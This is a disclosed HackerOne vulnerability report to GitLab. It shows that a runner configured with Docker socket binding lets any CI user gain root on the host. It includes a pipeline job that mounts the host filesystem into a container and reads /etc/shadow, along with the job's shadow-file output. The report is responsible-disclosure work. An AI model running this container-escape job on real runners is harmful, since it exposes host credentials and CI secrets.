# Installing Gitlab runner with Docker-In-Docker allows root access

## Report Details
- **Report ID**: 1417211
- **URL**: https://hackerone.com/reports/1417211
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2021-12-05T16:06:44.086Z
- **Disclosed**: 2022-02-10T09:13:05.182Z

## Reporter
- **Username**: jafarakhondali
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

Installing a Gitlab runner using official documents: https://docs.gitlab.com/ee/ci/docker/using_docker_build.html#use-docker-socket-binding
allows any user with access to Gitlab CI to have root access on Gitlab Runner server.

### Steps to reproduce
Install Gitlab-runner binary using official documents and run Docker-in-Docker:
```
sudo gitlab-runner register -n \
  --url https://gitlab.com/ \
  --registration-token REGISTRATION_TOKEN \
  --executor docker \
  --description "My Docker Runner" \
  --docker-image "docker:19.03.12" \
  --docker-volumes /var/run/docker.sock:/var/run/docker.sock
```  
Then set "exploiter" tag for runner, and in a project that have access to this runner, enter following pipeline:
```
stages:
  - exploiter
exploiter:
    stage: exploiter
    when: manual
    tags:
      - exploiter
    script:
      - docker run --rm  --net=host --pid=host --ipc=host --volume /:/host ubuntu bash -c "cat /host/etc/shadow"
```
and run the job.

### Impact
Allows root access on Gitlab-runner server

### What is the current *bug* behavior?
Sample output of job allows reading /etc/shadow of server.
```
Running with gitlab-runner 14.5.1 (de104fcd)
  on My Docker Runner 4j_ZSXte
Preparing the "docker" executor 00:04
Using Docker executor with image docker:19.03.12 ...
Pulling docker image docker:19.03.12 ...
Using docker image sha256:81f5749c9058a7284e6acd8e126f2b882765a17b9ead14422b51cde1a110b85c for docker:19.03.12 with digest docker@sha256:d41efe7ad0df5a709cfd4e627c7e45104f39bbc08b1b40d7fb718c562b3ce135 ...
Preparing environment 00:02
Running on runner-4jzsxte-project-28249719-concurrent-0 via ubuntu-g1-1-1-25-su-1...
Getting source from Git repository 00:03
Fetching changes with git depth set to 50...
Reinitialized existing Git repository in /builds/foroozan2/barika/.git/
Checking out e64249e2 as main...
Skipping Git submodules setup
Executing "step_script" stage of the job script 00:10
Using docker image sha256:81f5749c9058a7284e6acd8e126f2b882765a17b9ead14422b51cde1a110b85c for docker:19.03.12 with digest docker@sha256:d41efe7ad0df5a709cfd4e627c7e45104f39bbc08b1b40d7fb718c562b3ce135 ...
$ docker run --rm --privileged --net=host --pid=host --ipc=host --volume /:/host ubuntu bash -c "cat /host/etc/shadow"
Unable to find image 'ubuntu:latest' locally
latest: Pulling from library/ubuntu
7b1a6ab2e44d: Pulling fs layer
7b1a6ab2e44d: Verifying Checksum
7b1a6ab2e44d: Download complete
7b1a6ab2e44d: Pull complete
Digest: sha256:626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322
Status: Downloaded newer image for ubuntu:latest
root:*:18438:0:99999:7:::
daemon:*:18438:0:99999:7:::
bin:*:18438:0:99999:7:::
sys:*:18438:0:99999:7:::
sync:*:18438:0:99999:7:::
games:*:18438:0:99999:7:::
man:*:18438:0:99999:7:::
lp:*:18438:0:99999:7:::
mail:*:18438:0:99999:7:::
news:*:18438:0:99999:7:::
uucp:*:18438:0:99999:7:::
proxy:*:18438:0:99999:7:::
www-data:*:18438:0:99999:7:::
backup:*:18438:0:99999:7:::
list:*:18438:0:99999:7:::
irc:*:18438:0:99999:7:::
gnats:*:18438:0:99999:7:::
nobody:*:18438:0:99999:7:::
systemd-network:*:18438:0:99999:7:::
systemd-resolve:*:18438:0:99999:7:::
systemd-timesync:*:18438:0:99999:7:::
messagebus:*:18438:0:99999:7:::
syslog:*:18438:0:99999:7:::
_apt:*:18438:0:99999:7:::
tss:*:18438:0:99999:7:::
uuidd:*:18438:0:99999:7:::
tcpdump:*:18438:0:99999:7:::
sshd:*:18438:0:99999:7:::
landscape:*:18438:0:99999:7:::
pollinate:*:18438:0:99999:7:::
systemd-coredump:!!:18966::::::
ubuntu:!:18966:0:99999:7:::
lxd:!:18966::::::
gitlab-runner:!:18966:0:99999:7:::
```

### What is the expected *correct* behavior?

Although this issue may be known to Gitlab team, there is no security warning in documents for not binding docker socket, or at least use it only on trusted servers. Currently I'm encountering many clients that were not aware of this security issue and were thinking they've provided isolation in their teams. Such issue allows a remote attacker to malform CI process and have access to sensitive data.
Gitlab documents should inform users for such vulnerability and provide documents on alternative-safe methods to use Dind such as rootless docker.

## Impact

An attacker can have access to projects and their sensitive data running in Gitlab-CI by having root access of Gitlab server. Many projects store credentials in their CI process, allowing the Gitlab runner to have access to their production environment.

## Attachments
No attachments
